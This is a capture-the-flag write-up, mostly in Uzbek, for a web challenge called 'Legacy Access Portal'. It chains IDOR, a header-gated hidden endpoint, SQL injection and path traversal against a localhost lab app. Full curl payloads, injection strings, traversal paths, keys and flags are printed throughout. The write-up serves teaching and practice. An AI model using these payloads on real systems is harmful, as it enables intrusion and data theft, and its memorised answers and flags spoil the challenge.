# Legacy Access Portal

| Field | Value |
|-------|-------|
| Category | Web |
| Points | ? |

## Description

> A legacy internal archive portal from 2019 is still running.
> The IT department has been planning to shut it down "next quarter" for years.
> The system is still live — and it still has the old vulnerabilities.


## Solution

**Vulnerability chain:** IDOR → Hidden Endpoint → SQL Injection → Path Traversal

# Legacy Access Portal — To'liq Yechim (Writeup)

**Kategoriya:** Web  
**Daraja:** Easy  
**Zaifliklar zanjiri:** IDOR → Yashirin endpoint → SQL Injection → Path Traversal

---

## Umumiy ko'rinish

To'rtta bosqich ketma-ket amalga oshiriladi. Har bir bosqich keyingi bosqich uchun zarur bo'lgan ma'lumotni beradi. Bosqichlarni o'tkazib bo'lmaydi.

---

## BOSQICH 1 — IDOR (Insecure Direct Object Reference)

### Zaiflik nima?

`/dashboard?user_id=` endpointida server foydalanuvchi sessiyasidagi `user_id` bilan so'rovdagi `user_id` mos kelishini **tekshirmaydi**. Xohlagan foydalanuvchi profilini ko'rish mumkin.

### Qanday topish mumkin?

1. Tizimga `student / student123` bilan kiring.
2. Dashboard sahifasi ochiladi: `/dashboard?user_id=2`
3. URL dagi `user_id` ni `1` ga o'zgartiring:
   ```
   /dashboard?user_id=1
   ```
4. `developer` foydalanuvchisining profili ko'rinadi.
5. **Eslatma** maydonida:
   ```
   Dev eslatma: Kirish kaliti: DEV-8472-ALPHA
   ```

### Natija
`DEV-8472-ALPHA` — keyingi bosqich uchun kerakli kalit.

---

## BOSQICH 2 — Yashirin Endpoint + Header orqali kirish

### Zaiflik nima?

`/dev-panel` endpointi mavjud, lekin u faqat `X-DEV-KEY` HTTP headeri to'g'ri bo'lganda ochiladi. Bu endpoint sahifa kodida yo'q, lekin ilovada mavjud.

### Qanday topish mumkin?

`/dev-panel` ga oddiy so'rov jo'natilsa 403 xatosi qaytadi.  
1-bosqichda topilgan kalit bilan so'rov jo'natish kerak:

**curl orqali:**
```bash
curl -s http://localhost:5000/dev-panel \
  -H "Cookie: session=<sizning_session_cookie>" \
  -H "X-DEV-KEY: DEV-8472-ALPHA"
```

**Brauzer kengaytmasi (masalan Modheader) orqali:**
- Header qo'shish: `X-DEV-KEY: DEV-8472-ALPHA`
- `/dev-panel` ga o'ting

### Dev panel sahifasida

Panel sahifasida havola ko'rinadi:
```
/static/dev.js
```

### dev.js ni o'qish

`/static/dev.js` faylini ochamiz va ichida quyidagi kommentni topamiz:
```javascript
// endpoint: /internal?debug=true
```

### Natija
Keyingi bosqich: `/internal?debug=true`

---

## BOSQICH 3 — SQL Injection

### Zaiflik nima?

`/internal?debug=true&q=` endpointida `q` parametri bevosita SQL so'rovga qo'shiladi (parametrlanmagan):

```python
query = "SELECT * FROM secrets WHERE name = '" + q + "'"
```

SQL xatoliklari ham ko'rsatiladi — bu "easy" darajasi uchun mo'ljallangan.

### Qanday aniqlash mumkin?

Birinchi tekshiruv:
```
/internal?debug=true&q='
```
SQL xatoligi chiqadi — bu SQLi mavjudligini ko'rsatadi.

### Jadval tarkibini aniqlash

```
/internal?debug=true&q=' OR '1'='1
```
Barcha yozuvlar chiqadi — bu oddiy OR bypass.

Yoki UNION orqali:
```
/internal?debug=true&q=' UNION SELECT 1,name,value FROM secrets--
```

### Natijadan token olish

Javobda:
```python
{'id': 1, 'name': 'archive_token', 'value': 'ARCHIVE-ACCESS-9921'}
```

### Natija
`ARCHIVE-ACCESS-9921` — keyingi bosqich uchun token.

---

## BOSQICH 4 — Path Traversal (Final)

### Zaiflik nima?

`/archive?token=...&file=...` endpointida `file` parametri `os.path.join` ga tekshiruvsiz uzatiladi:

```python
filepath = os.path.join('/app/runtime', file_param)
```

`os.path.join` mantig'i: agar `file_param` `../` bilan boshlanmasa, oddiy birlashadi. Lekin Python da:
```python
os.path.join('/app/runtime', '../flag.txt')
# => '/app/runtime/../flag.txt'
# Bu /app/flag.txt ga teng
```

### Payload

```
/archive?token=ARCHIVE-ACCESS-9921&file=../flag.txt
```

### Fayl joylashuvi

- `flag.txt` → `/app/runtime/flag.txt` ga yoziladi (entrypoint.sh tomonidan)
- `base_dir` = `/app/runtime`
- `os.path.join('/app/runtime', '../flag.txt')` → `/app/runtime/../flag.txt` → `/app/flag.txt`

**Diqqat:** Flag `/app/runtime/flag.txt` da joylashgan, shuning uchun to'g'ridan-to'g'ri:

```
/archive?token=ARCHIVE-ACCESS-9921&file=flag.txt
```

Bu ham ishlaydi, chunki flag `runtime` papkasidayoq.

### Natija

```
CHC{eski_tizim_hamon_ishlaydi_zaiflik_bilan}
```
*(Haqiqiy flag muhit o'zgaruvchisi FLAG dan olinadi)*

---

## To'liq zanjir — qisqacha

```
1. /dashboard?user_id=1
   → DEV-8472-ALPHA

2. GET /dev-panel
   Header: X-DEV-KEY: DEV-8472-ALPHA
   → /static/dev.js
   → "endpoint: /internal?debug=true"

3. /internal?debug=true&q=' OR '1'='1
   → ARCHIVE-ACCESS-9921

4. /archive?token=ARCHIVE-ACCESS-9921&file=flag.txt
   → CHC{...}
```

---

## Payloadlar (to'liq)

```bash
# 1-bosqich
curl "http://localhost:5000/dashboard?user_id=1" \
  -H "Cookie: session=<TOKEN>"

# 2-bosqich
curl "http://localhost:5000/dev-panel" \
  -H "Cookie: session=<TOKEN>" \
  -H "X-DEV-KEY: DEV-8472-ALPHA"

# 3-bosqich (SQLi)
curl "http://localhost:5000/internal?debug=true&q=%27%20OR%20%271%27%3D%271" \
  -H "Cookie: session=<TOKEN>"

# 4-bosqich (Path Traversal)
curl "http://localhost:5000/archive?token=ARCHIVE-ACCESS-9921&file=flag.txt" \
  -H "Cookie: session=<TOKEN>"
```

---

*Musoboqa tashkilotchilari uchun: flag ishga tushirishda `FLAG` muhit o'zgaruvchisi orqali o'rnatiladi.*


## Flag

`CHC{7a14ba!$rni_41_v4zLf&s1_!shl4d1n6}`
